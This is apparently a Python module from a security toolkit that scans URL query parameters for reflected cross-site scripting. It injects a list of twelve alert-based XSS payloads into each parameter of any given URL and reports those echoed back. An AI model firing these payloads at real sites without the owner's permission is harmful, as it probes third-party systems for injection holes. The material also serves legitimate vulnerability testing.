#!/usr/bin/env python3
"""
XSS Scanner Module
Tests for reflected XSS vulnerabilities in URL parameters
"""

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style
import time

PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<details open ontoggle=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<math href=\"javascript:alert('XSS')\">click</math>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "><script>alert('XSS')</script>",
]

class XSSScanner:
    def __init__(self, url, timeout=5):
        self.url = url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SecToolKit-XSS-Scanner/1.0'
        })
        self.vulnerabilities = []
    
    def get_params(self):
        """استخراج پارامترهای URL"""
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        return list(params.keys())
    
    def test_payload(self, param, payload):
        """تست یک پیلود روی یک پارامتر"""
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        
        params[param] = [payload]
        
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
        
        try:
            response = self.session.get(new_url, timeout=self.timeout)
            
            if payload in response.text:
                return {
                    'param': param,
                    'payload': payload,
                    'url': new_url,
                    'status': 'VULNERABLE! 🚨'
                }
            else:
                return {
                    'param': param,
                    'payload': payload,
                    'status': 'Not vulnerable'
                }
        except Exception as e:
            return {
                'param': param,
                'payload': payload,
                'status': f'Error: {str(e)[:50]}'
            }
    
    def scan(self):
        """اجرای اسکن کامل"""
        params = self.get_params()
        
        if not params:
            print(f"{Fore.YELLOW}[!] No parameters found in URL{Style.RESET_ALL}")
            return []
        
        print(f"{Fore.CYAN}[*] Found {len(params)} parameter(s): {', '.join(params)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Testing {len(PAYLOADS)} payloads...{Style.RESET_ALL}\n")
        
        results = []
        total_tests = len(params) * len(PAYLOADS)
        test_count = 0
        
        for param in params:
            for payload in PAYLOADS:
                test_count += 1
                print(f"{Fore.BLUE}[{test_count}/{total_tests}] Testing {param} with: {payload[:30]}...{Style.RESET_ALL}", end=' ')
                
                result = self.test_payload(param, payload)
                
                if 'VULNERABLE' in result.get('status', ''):
                    print(f"{Fore.RED}⚠️  VULNERABLE!{Style.RESET_ALL}")
                    results.append(result)
                else:
                    print(f"{Fore.GREEN}✓ Safe{Style.RESET_ALL}")
                
                time.sleep(0.1)
        
        return results
    
    def report(self, results):
        """گزارش نهایی"""
        print("\n" + "="*60)
        print(f"{Fore.YELLOW}📊 SCAN REPORT{Style.RESET_ALL}")
        print("="*60)
        
        if not results:
            print(f"{Fore.GREEN}✅ No XSS vulnerabilities found!{Style.RESET_ALL}")
            return
        
        print(f"{Fore.RED}⚠️  Found {len(results)} vulnerable parameter(s):{Style.RESET_ALL}\n")
        
        for i, vuln in enumerate(results, 1):
            print(f"{Fore.RED}[{i}] Parameter: {vuln['param']}{Style.RESET_ALL}")
            print(f"    Payload: {vuln['payload']}")
            print(f"    URL: {vuln['url'][:80]}...")
            print()


def scan_url(url):
    """تابع اصلی برای صدا زدن از main.py"""
    scanner = XSSScanner(url)
    results = scanner.scan()
    scanner.report(results)
    return results


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        scan_url(sys.argv[1])
    else:
        print("Usage: python3 scanner/xss.py <url>")
